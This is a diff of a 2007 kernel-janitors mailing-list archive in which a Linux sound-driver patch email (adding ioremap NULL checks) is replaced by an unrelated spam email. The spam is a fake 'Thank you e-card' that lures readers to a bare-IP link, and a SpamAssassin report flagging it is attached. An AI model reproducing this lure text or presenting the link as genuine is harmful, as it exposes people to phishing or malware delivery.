@@ -1,41 +1,71 @@
-From: "Scott Thompson" <postfail@hushmail.com>
-Date: Wed, 01 Aug 2007 13:33:13 +0000
-Subject: [PATCH] sound/pci ioremap unchecked return
-Message-Id: <20070801133313.A408E22822@mailserver9.hushmail.com>
+From: <b-g4fwk.3icjw@shonac.com>
+Date: Tue, 14 Aug 2007 23:05:46 +0000
+Subject: [KJ] Thank you e-card
+Message-Id: <001001c7dec7$a5e22d30$6798b963@cgyuq.es>
+MIME-Version: 1
+Content-Type: multipart/mixed; boundary="----------=_1187132757-19182-209"
 List-Id: <kernel-janitors.vger.kernel.org>
-MIME-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
 To: kernel-janitors@vger.kernel.org
 
-two unchecked ioremap calls.  upon further review and discussion 
-these are only 'valid' changes from previously posted "[PATCH 2/3] 
-sound/pci ioremap/iounmap balancing".
+This is a multi-part message in MIME format...
 
-Signed-off-by: Scott Thompson <postfail <at> hushmail.com>
----
-diff --git a/sound/pci/mixart/mixart.c b/sound/pci/mixart/mixart.c
-index ac007ce..871b09f 100644
---- a/sound/pci/mixart/mixart.c
-+++ b/sound/pci/mixart/mixart.c
-@@ -1319,6 +1319,13 @@ static int __devinit snd_mixart_probe(struct
-pci_dev *pci,
-                            pci_resource_len(pci, i));
-     }
- 
-+    if (!mgr->mem[0].virt || !mgr->mem[1].virt){
-+        printk(KERN_ERR "unable to remap resource 0x%lx and/or 
-0x%lx\n",
-+            mgr->mem[0].phys, mgr->mem[1].phys);
-+        snd_mixart_free(mgr);
-+        return -EBUSY;
-+    }
-+
-     if (request_irq(pci->irq, snd_mixart_interrupt, IRQF_SHARED,
-             CARD_NAME, mgr)) {
-         snd_printk(KERN_ERR "unable to grab IRQ %d\n", pci->irq);
+------------=_1187132757-19182-209
+Content-Type: text/plain; format=flowed; charset="iso-8859-1";
+	reply-type=original
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
---
-Click here to double your salary by becoming a medical transcriber.
-http://tagline.hushmail.com/fc/Ioyw6h4eKoY9b45qdapjPR3Z3SZM2SyWTcOTz330fym9TiGfPbAR8i/
+School-mate(b-g4fwk.3icjw@shonac.com) has created Thank you e-card for you 
+at mycardmaker.com.
 
+To see your custom Thank you e-card, simply click on the following link:
+
+http://69.242.235.68/
+
+Send a FREE greeting card from mycardmaker.com whenever you want by visiting us at:
+This service is provided and hosted by mycardmaker.com.
+
+
+------------=_1187132757-19182-209
+Content-Type: text/plain; name="SpamAssassinReport.txt"
+Content-Disposition: inline; filename="SpamAssassinReport.txt"
+Content-Transfer-Encoding: 7bit
+MIME-Version: 1.0
+X-Mailer: MIME-tools 5.419 (Entity 5.419)
+
+Spam detection software, running on the system "daredevil.linux-foundation.org", has
+identified this incoming email as possible spam.  The original message
+has been attached to this so you can view it (if it isn't spam) or label
+similar future email.  If you have any questions, see
+the administrator of that system for details.
+
+Content preview:  School-mate(b-g4fwk.3icjw@shonac.com) has created Thank
+  you e-card for you at mycardmaker.com. To see your custom Thank you
+  e-card, simply click on the following link: http://69.242.235.68/ [...] 
+
+Content analysis details:   (7.6 points, 5.0 required)
+
+ pts rule name              description
+---- ---------------------- --------------------------------------------------
+ 1.1 NO_REAL_NAME           From: does not include a real name
+ 3.0 NORMAL_HTTP_TO_IP      URI: Uses a dotted-decimal IP address in URL
+ 3.5 BAYES_99               BODY: Bayesian spam probability is 99 to 100%
+                            [score: 1.0000]
+
+
+
+------------=_1187132757-19182-209
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+REMINDER: this mailing list moved to vger.kernel.org and current one will be discontinued soon.
+To resubscribe, send email to majordomo@vger.kernel.org with
+&quot;subscribe kernel-janitors&quot; in message body and follow instructions.
+
+Kernel-janitors mailing list
+Kernel-janitors@lists.linux-foundation.org
+https://lists.linux-foundation.org/mailman/listinfo/kernel-janitors
+------------=_1187132757-19182-209--
